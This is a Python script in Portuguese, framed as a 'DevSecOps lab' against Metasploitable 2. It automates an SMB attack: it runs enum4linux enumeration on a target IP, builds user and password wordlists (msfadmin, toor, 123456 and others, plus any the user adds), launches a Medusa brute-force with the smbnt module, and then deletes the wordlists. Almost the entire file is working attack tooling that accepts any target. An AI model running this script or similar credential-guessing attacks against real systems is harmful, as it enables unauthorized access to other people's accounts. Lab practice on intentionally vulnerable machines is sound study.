import os
import sys
import subprocess

# --- Configurações ---
USERS_FILE = "smb-users.txt"
PASS_FILE = "smb-pass-spray.txt"
ENUM_OUTPUT = "enum4-output.txt"
DEFAULT_USERS = ["user", "msfadmin", "service", "guest"]
DEFAULT_PASSWORDS = ["password", "123456", "Welcome123", "msfadmin", "toor"]

def get_custom_list(list_name, default_list):
    """Permite ao usuário adicionar itens personalizados à lista padrão."""
    custom_list = list(default_list)
    resposta = input(f"Deseja adicionar um {list_name} personalizado? (s/n): ").lower()
    if resposta in ['s', 'sim']:
        print(f"Digite os {list_name}s que deseja adicionar (um por linha). Digite 'fim' para terminar.")
        while True:
            item = input(f"Adicionar {list_name} (ou 'fim'): ").strip()
            if item.lower() == 'fim':
                break
            if item and item not in custom_list:
                custom_list.append(item)
    return custom_list

def save_list_to_file(file_name, data_list):
    """Salva a lista final em um arquivo de texto."""
    try:
        with open(file_name, 'w') as f:
            f.write('\n'.join(data_list) + '\n')
        print(f"[SUCESSO] Lista de {file_name} criada com {len(data_list)} itens.")
    except Exception as e:
        print(f"[ERRO] Falha ao salvar o arquivo {file_name}: {e}")
        sys.exit(1)

def executar_comando(comando, descricao, output_file=None):
    """Executa um comando de sistema e lida com a saída."""
    print(f"\n--- {descricao} ---")
    if not output_file:
        print(f"Comando: {' '.join(comando)}")
    
    try:
        # Redireciona a saída se um arquivo for especificado
        if output_file:
            with open(output_file, 'w') as f:
                subprocess.run(comando, stdout=f, stderr=subprocess.PIPE, check=True)
            print(f"✅ Execução concluída. Output salvo em {output_file}.")
        else:
            subprocess.run(comando, check=True)
            print("✅ Execução concluída.")
    except FileNotFoundError:
        print(f"[ERRO] Ferramenta '{comando[0]}' não encontrada. Certifique-se de que está instalada.")
        return False
    except subprocess.CalledProcessError as e:
        print(f"[AVISO] Comando executado, mas retornou erro: {e.stderr.decode().strip() or e.stdout.decode().strip()}. Continue a investigação nos logs.")
        return True # Permite que o script continue, já que a falha pode ser esperada (ex: sem credenciais)
    except Exception as e:
        print(f"[ERRO] Erro inesperado: {e}")
        return False
    return True

def main():
    print("--- 💻 DevSecOps Lab: Força Bruta SMB (Python) ---")
    
    # ETAPA 0: Solicita o IP
    target_ip_input = input("➡️ Digite o IP do Alvo SMB (Metasploitable 2 - ex: 192.168.15.36): ").strip()
    if not target_ip_input:
        print("[ERRO] IP do alvo não fornecido. Abortando.")
        return

    # ETAPA 1: Enumeração com enum4linux
    enum_cmd = ["enum4linux", "-a", target_ip_input]
    executar_comando(enum_cmd, "1. Enumeração com Enum4Linux", ENUM_OUTPUT)

    # ETAPA 2: Criação de Listas (Incluindo Interação)
    print("\n--- 2. Criação e Personalização das Wordlists ---")
    user_list = get_custom_list("usuário", DEFAULT_USERS)
    save_list_to_file(USERS_FILE, user_list)
    pass_list = get_custom_list("senha", DEFAULT_PASSWORDS)
    save_list_to_file(PASS_FILE, pass_list)
    
    # ETAPA 3: Ataque com Medusa
    medusa_cmd = [
        "medusa", 
        "-h", target_ip_input, 
        "-U", USERS_FILE, 
        "-P", PASS_FILE, 
        "-M", "smbnt", 
        "-t", "2", 
        "-T", "50"
    ]
    executar_comando(medusa_cmd, "3. Ataque de Força Bruta com Medusa (SMB)")
    
    # Limpeza
    print("\n--- Limpeza de Arquivos Temporários ---")
    os.remove(USERS_FILE)
    os.remove(PASS_FILE)
    print(f"Arquivos {USERS_FILE} e {PASS_FILE} removidos. Mantenha {ENUM_OUTPUT} para análise.")

if __name__ == "__main__":
    main()